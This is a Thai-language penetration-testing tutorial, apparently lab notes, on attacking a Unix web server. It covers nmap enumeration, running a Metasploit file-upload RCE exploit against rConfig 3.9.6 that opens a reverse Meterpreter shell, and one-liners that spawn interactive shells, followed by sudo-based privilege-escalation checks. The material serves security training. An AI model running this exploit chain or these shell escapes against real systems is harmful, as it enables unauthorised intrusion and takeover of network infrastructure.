# การแทรกซึมระบบ Unix/Linux

## สถิติและความสำคัญ

ตามการศึกษาของ W3Techs พบว่า **มากกว่า 70% ของเว็บไซต์ (webservers) ทำงานบนระบบ Unix-based** ซึ่งหมายความว่าเราจะได้ประโยชน์อย่างมากจากการเรียนรู้เกี่ยวกับ Unix/Linux และวิธีการได้ shell session เพื่อ pivot ไปยังส่วนอื่นๆ ในสภาพแวดล้อม

### สถานการณ์จริง:
- องค์กรหลายแห่งใช้บริการ 3rd party และ Cloud providers สำหรับโฮสต์เว็บไซต์
- แต่หลายองค์กรยังโฮสต์เว็บไซต์/แอปพลิเคชันบนเซิร์ฟเวอร์ในเครือข่ายภายใน (on-prem)
- หากเราได้ shell session บนระบบเหล่านี้ เราสามารถ pivot ไปยังระบบอื่นในเครือข่ายภายในได้

## ข้อพิจารณาที่สำคัญ

ก่อนการโจมตี เราควรตั้งคำถามต่อไปนี้:

1. **ระบบใช้ Linux Distribution ใด?**
2. **Shell และภาษา Programming อะไรมีอยู่ในระบบ?**
3. **ระบบทำหน้าที่อะไรในเครือข่าย?**
4. **ระบบโฮสต์แอปพลิเคชันอะไร?**
5. **มีช่องโหว่ที่รู้จักอยู่หรือไม่?**

---

## การได้ Shell ผ่านการโจมตีแอปพลิเคชันที่มีช่องโหว่

### ขั้นตอนที่ 1: Enumerate เป้าหมาย

```bash
nmap -sC -sV 10.129.201.101
```

**ผลลัพธ์ที่ได้:**

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
111/tcp  open  rpcbind  2-4 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
3306/tcp open  mysql    MySQL (unauthorized)
```

### การวิเคราะห์ผลลัพธ์:

**พอร์ตที่เปิด:**
- **80 (HTTP)** และ **443 (HTTPS):** Web Server
- **3306 (MySQL):** Database Server
- **21 (FTP):** File Transfer Protocol

**ข้อมูลที่ได้:**
- **Web Stack:** Apache 2.4.6, PHP 7.2.34
- **OS:** CentOS Linux
- **สันนิษฐาน:** นี่คือ Web Server ที่โฮสต์แอปพลิเคชันบนเว็บ

---

### ขั้นตอนที่ 2: ตรวจสอบเว็บไซต์

เมื่อเข้าไปดูผ่าน Web Browser พบว่าเป็น:

**rConfig Configuration Management Tool**
- เครื่องมือจัดการการตั้งค่าเครือข่าย
- ใช้โดย Network & System Administrators
- ใช้สำหรับตั้งค่า Network Appliances แบบอัตโนมัติ
- **เวอร์ชัน: 3.9.6** (แสดงอยู่ด้านล่างหน้า login)

### ความสำคัญของ rConfig:

**ถ้า compromise สำเร็จ:**
- สามารถ pivot ไปยังอุปกรณ์เครือข่ายสำคัญได้
- อาจควบคุมเครือข่ายทั้งหมดได้ (เพราะ rConfig มี admin access ไปยัง network appliances ทั้งหมด)
- ถือเป็นการค้นพบที่ **วิกฤตสูงมาก (Critical)**

---

### ขั้นตอนที่ 3: ค้นหาช่องโหว่

**วิธีการค้นหา:**

1. **ใช้ Search Engine:**
   - คำค้นหา: `rConfig 3.9.6 vulnerability`
   - พบ: CVEs, Exploits, และ PoCs หลายตัว

2. **ใช้ Metasploit Search:**

```bash
msf6 > search rconfig
```

**ผลลัพธ์:**
```
exploit/linux/http/rconfig_ajaxarchivefiles_rce  (2020-03-11)
exploit/unix/webapp/rconfig_install_cmd_exec     (2019-10-28)
```

### เทคนิคขั้นสูง - หา Exploit บน GitHub:

หากไม่เจอใน MSF สามารถค้นหาเพิ่มเติมได้:
- คำค้นหา: `rConfig 3.9.6 exploit metasploit github`
- พบ exploit module: `rconfig_vendors_auth_file_upload_rce.rb`

**วิธีเพิ่ม Exploit Module ใหม่:**

```bash
# หาตำแหน่งที่เก็บ exploits
locate exploits

# ใน Pwnbox จะอยู่ที่:
/usr/share/metasploit-framework/modules/exploits
```

**การติดตั้ง:**
- Download exploit จาก GitHub (ใช้ wget)
- Copy ไปวางใน `/usr/share/metasploit-framework/modules/exploits/linux/http/`
- ตั้งชื่อไฟล์ให้มีนามสกุล `.rb`

**Update MSF:**
```bash
apt update; apt install metasploit-framework
```

---

### ขั้นตอนที่ 4: ใช้ Exploit เพื่อได้ Shell

**Load Exploit Module:**

```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

**Execute Exploit:**

```bash
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable.
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened
```

---

## กระบวนการทำงานของ Exploit

Exploit นี้ทำงานตามลำดับ:

1. **ตรวจสอบเวอร์ชัน:** Check ว่าเป็น rConfig เวอร์ชันที่มีช่องโหว่
2. **Authentication:** Login เข้า rConfig web
3. **Upload Payload:** อัปโหลด PHP payload สำหรับ reverse shell
4. **Execute & Clean:** รัน payload แล้วลบทิ้ง
5. **Shell Session:** ได้ Meterpreter shell session

---

### ขั้นตอนที่ 5: โต้ตอบกับ Shell

**Drop ลง System Shell:**

```bash
meterpreter > shell
Process 3958 created.
Channel 0 created.

# ทดสอบคำสั่ง
dir
ls
```

**ปัญหาที่พบ:** ได้ **Non-TTY Shell**
- ไม่มี prompt
- ไม่สามารถใช้คำสั่งสำคัญได้ เช่น `su`, `sudo`
- เกิดเพราะ payload รันโดย `apache` user

---

### ขั้นตอนที่ 6: Spawn TTY Shell ด้วย Python

**ตรวจสอบว่ามี Python:**

```bash
which python
```

**Spawn TTY Shell:**

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

**ผลลัพธ์:**

```bash
sh-4.2$ whoami
apache
```

### คำอธิบายคำสั่ง:

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

- **python -c:** รัน Python command แบบ one-liner
- **import pty:** นำเข้า pty module (Pseudo-Terminal)
- **pty.spawn("/bin/sh"):** Execute bourne shell binary

**ผลที่ได้:**
- มี prompt (`sh-4.2$`)
- สามารถใช้คำสั่งระบบได้เต็มรูปแบบ
- พร้อมสำหรับการ enumerate และ privilege escalation ต่อไป

---

# ทำไม Payload ที่รันโดย `apache` user ถึงได้ Non-TTY Shell?

## ความแตกต่างระหว่าง TTY Shell และ Non-TTY Shell

### TTY Shell (Interactive Shell)
- มี **prompt** แสดง (เช่น `user@hostname:~$`)
- รองรับคำสั่งแบบโต้ตอบ (interactive commands)
- ใช้ได้กับคำสั่งที่ต้องการ terminal จริงๆ เช่น `su`, `sudo`, `vim`, `nano`
- มีการควบคุม terminal features: tab completion, signal handling (Ctrl+C)
- มี job control (background/foreground processes)

### Non-TTY Shell (Non-Interactive Shell)
- **ไม่มี prompt** หรือมีแค่ช่องว่างๆ
- คำสั่งบางตัวใช้ไม่ได้ เช่น `su`, `sudo`
- ไม่มี tab completion
- กด Ctrl+C อาจตัด connection ทั้งหมด
- จำกัดการใช้งานมาก

---

## เหตุผลที่ `apache` User ได้ Non-TTY Shell

### 1. **Apache User ไม่ใช่ Interactive User**

Apache (หรือ www-data, httpd) เป็น **service account** หรือ **system account** ที่ออกแบบมาเพื่อ:
- รัน web server process
- **ไม่ได้ออกแบบให้ login เข้าระบบ**
- **ไม่มี shell environment ที่สมบูรณ์**

```bash
# ตรวจสอบ apache user ใน /etc/passwd
cat /etc/passwd | grep apache
# อาจจะเห็น:
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
#                                        ^^^^^^^^
#                                   ไม่มี shell จริง!
```

### 2. **ไม่มี Environment Variables ที่จำเป็น**

เมื่อ admin login ปกติ ระบบจะตั้งค่า environment variables เช่น:
```bash
SHELL=/bin/bash
TERM=xterm-256color
USER=admin
HOME=/home/admin
PATH=/usr/local/bin:/usr/bin:/bin
```

แต่เมื่อ **payload รันโดย apache:**
```bash
# Environment variables จะมีน้อยมาก หรือไม่สมบูรณ์
SHELL=       # อาจไม่มีเลย
TERM=dumb    # หรือเป็น dumb terminal
USER=apache
HOME=/var/www  # หรืออาจไม่มี
PATH=...     # อาจจำกัด
```

### 3. **Payload Execute ผ่าน Web Application Context**

กระบวนการที่เกิดขึ้น:

```
1. Web Browser → HTTP Request → Apache Web Server
2. Apache รัน PHP/Application Code
3. Vulnerable Code → Execute Payload
4. Payload runs as `apache` user (ตัวที่รัน web server)
5. Shell connection สร้างขึ้นใน context ของ web server process
```

**ปัญหาคือ:** 
- Web server process **ไม่ได้รันใน terminal**
- ไม่มี TTY (teletypewriter) allocated
- เป็นเพียง process ที่ฟัง HTTP requests
- จึงไม่มี interactive shell features

---

# การ Spawn Interactive Shells

หลังจากที่เราได้ shell session แล้ว มักจะพบว่า shell ที่ได้มานั้นมีข้อจำกัด (เรียกว่า **jail shell**) เราจึงต้องใช้วิธีต่างๆ ในการ spawn TTY shell เพื่อให้สามารถใช้คำสั่งได้มากขึ้นและมี prompt ในการทำงาน

## สถานการณ์ที่พบ

อาจมีบางครั้งที่:
- เราได้ shell ที่มีข้อจำกัดมาก
- **Python ไม่ได้ติดตั้งอยู่ในระบบ**
- ต้องใช้วิธีอื่นในการ spawn interactive shell

---

## วิธีการ Spawn Interactive Shell หลายแบบ

> **หมายเหตุ:** `/bin/sh` หรือ `/bin/bash` สามารถเปลี่ยนเป็น binary ของ shell interpreter ที่มีอยู่ในระบบนั้นๆ ได้

### Linux Systems ทั่วไปมักมี:
- **Bourne Shell** (`/bin/sh`)
- **Bourne Again Shell** (`/bin/bash`)

---

## 1. ใช้ /bin/sh -i

คำสั่งนี้จะ execute shell interpreter ในโหมด interactive (`-i`)

```bash
/bin/sh -i
```

**ผลลัพธ์:**
```bash
sh: no job control in this shell
sh-4.2$
```

**คุณสมบัติ:**
- ได้ shell แบบ interactive
- แต่ไม่มี job control (ไม่สามารถใช้ background/foreground jobs)

---

## 2. ใช้ Perl

หาก Perl ติดตั้งอยู่ในระบบ สามารถใช้คำสั่งเหล่านี้:

### วิธีที่ 1: One-liner
```bash
perl -e 'exec "/bin/sh";'
```

### วิธีที่ 2: จาก Script
```perl
perl: exec "/bin/sh";
```
> **หมายเหตุ:** คำสั่งนี้ควรรันจาก script file

---

## 3. ใช้ Ruby

หาก Ruby ติดตั้งอยู่ในระบบ:

```ruby
ruby: exec "/bin/sh"
```
> **หมายเหตุ:** คำสั่งนี้ควรรันจาก script file

**ตัวอย่างใช้งานจริง:**
```bash
ruby -e 'exec "/bin/sh"'
```

---

## 4. ใช้ Lua

หาก Lua ติดตั้งอยู่ในระบบ ใช้ `os.execute` method:

```lua
lua: os.execute('/bin/sh')
```
> **หมายเหตุ:** คำสั่งนี้ควรรันจาก script file

**ตัวอย่างใช้งานจริง:**
```bash
lua -e "os.execute('/bin/sh')"
```

---

## 5. ใช้ AWK

**AWK** เป็นภาษา C-like สำหรับ pattern scanning และ processing ที่มีอยู่ในระบบ Unix/Linux เกือบทุกตัว

- ใช้โดย developers และ sysadmins ในการสร้าง reports
- สามารถใช้ spawn interactive shell ได้

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**อธิบาย:**
- `BEGIN` = execute ก่อนที่จะ process input ใดๆ
- `system()` = เรียก system command
- `"/bin/sh"` = เปิด shell

---

## 6. ใช้ Find Command

**Find** เป็นคำสั่งค้นหาไฟล์และ directory ที่มีอยู่ในระบบ Unix/Linux เกือบทุกตัว

### วิธีที่ 1: Find + AWK

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

**อธิบาย:**
1. `find /` = ค้นหาจาก root directory
2. `-name nameoffile` = ค้นหาไฟล์ที่ชื่อตรงกับที่ระบุ
3. `-exec` = execute คำสั่งต่อไปนี้
4. `/bin/awk 'BEGIN {system("/bin/sh")}'` = รัน awk script เพื่อเปิด shell
5. `\;` = จบคำสั่ง exec

**ข้อจำกัด:** ต้องหาไฟล์เจอจึงจะได้ shell

### วิธีที่ 2: Find + Exec โดยตรง

```bash
find . -exec /bin/sh \; -quit
```

**อธิบาย:**
1. `find .` = ค้นหาใน current directory
2. `-exec /bin/sh \;` = execute shell interpreter โดยตรง
3. `-quit` = หยุดหลังจากเจอครั้งแรก

**ข้อจำกัด:** ถ้า find ไม่เจอไฟล์ที่ระบุ = ไม่ได้ shell

---

## 7. ใช้ VIM

ใช่! เราสามารถตั้งค่า shell interpreter จากใน **VIM** (text editor บน command-line)

> **หมายเหตุ:** เป็นสถานการณ์ที่เฉพาะเจาะจงมาก แต่ดีที่ได้รู้ไว้

### วิธีที่ 1: Vim Command-line Mode

```bash
vim -c ':!/bin/sh'
```

**อธิบาย:**
- `-c` = execute command หลังจากเปิด vim
- `:!` = execute shell command
- `/bin/sh` = shell ที่ต้องการเปิด

### วิธีที่ 2: Vim Escape

```bash
# 1. เปิด vim
vim

# 2. ใน vim ให้พิมพ์
:set shell=/bin/sh
:shell
```

**อธิบาย:**
1. `:set shell=/bin/sh` = ตั้งค่า shell interpreter
2. `:shell` = escape ออกไปยัง shell

---

## ข้อพิจารณาเรื่อง Execution Permissions

นอกจากรู้วิธี spawn shell แล้ว **เราต้องคำนึงถึง permissions** ของ account ที่เราได้มาด้วย

### 1. ตรวจสอบ File Permissions

```bash
ls -la <path/to/fileorbinary>
```

**ผลลัพธ์ตัวอย่าง:**
```bash
-rwxr-xr-x 1 root root 1234 Jan 1 12:00 /bin/sh
```

**อ่านผลลัพธ์:**
- `rwx` (owner) = read, write, execute
- `r-x` (group) = read, execute
- `r-x` (others) = read, execute

### 2. ตรวจสอบ Sudo Permissions

```bash
sudo -l
```

**ผลลัพธ์ตัวอย่าง:**
```bash
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

**อธิบาย:**
- `(ALL : ALL)` = รันคำสั่งใดก็ได้ในฐานะ user ใดก็ได้
- `NOPASSWD: ALL` = ไม่ต้องใส่รหัสผ่าน
- **นี่คือช่องทางสำหรับ privilege escalation!**

---

## ข้อควรระวัง

### ⚠️ สำหรับ `sudo -l`:
- **ต้องมี stable interactive shell** ถึงจะรันได้
- ถ้าอยู่ใน unstable shell หรือ non-interactive shell = อาจไม่ได้ผลลัพธ์

### ประโยชน์ของการตรวจสอบ Permissions:
1. **รู้ว่าเราสามารถรันคำสั่งอะไรได้บ้าง**
2. **ได้ไอเดียเกี่ยวกับช่องทาง privilege escalation**
3. **เข้าใจข้อจำกัดของ shell session ปัจจุบัน**

---

